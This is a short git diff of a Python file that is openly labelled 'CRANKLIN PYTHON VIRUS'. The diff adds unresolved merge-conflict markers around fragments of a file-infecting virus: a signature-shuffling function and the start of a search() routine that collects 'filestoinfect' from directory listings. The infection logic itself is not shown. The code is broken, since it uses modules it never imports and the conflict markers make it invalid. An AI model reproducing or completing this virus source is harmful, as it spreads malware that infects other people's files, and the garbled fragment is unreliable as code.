@@ -1,7 +1,10 @@
 import os
 import datetime
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
+<<<<<<< HEAD
 
+=======
+>>>>>>> origin/master
 def shuffle_text(SIGNATURE):
     if isinstance(SIGNATURE, unicode):
         temp= array.array('u', SIGNATURE)
@@ -11,7 +14,10 @@ def shuffle_text(SIGNATURE):
         converter= temp.tostring
     random.shuffle(temp)
     return converter()
+<<<<<<< HEAD
 
+=======
+>>>>>>> origin/master
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
